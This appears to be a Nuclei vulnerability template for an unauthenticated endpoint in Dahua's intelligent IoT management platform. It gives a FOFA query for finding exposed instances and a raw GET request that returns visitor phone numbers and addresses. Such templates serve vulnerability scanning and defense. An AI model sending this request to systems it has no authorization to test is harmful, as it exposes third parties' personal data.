id: dahua-iot-platform-info-leak-getreviewinfobyvisitorid

info:
  name: "大华智能物联综合管理平台getReviewInfoByVisitorId接口未授权访问导致敏感信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="*客户端会小于800*" || body="/static/fontshd/font-hd.css"
      大华智能物联综合管理平台在getReviewInfoByVisitorId接口实现中存在数据访问控制缺陷，攻击者可利用该接口未经验证的访问权限，获取存储在系统中的用户身份信息、联系方式及地理位置数据
  tags: 大华

http:
- raw:
  - |
    GET /evo-apigw/evo-visitor/1.0.0/card/visitor/getReviewInfoByVisitorId/1 HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'v_phone'
  - type: word
    part: body
    words:
    - 'v_address'
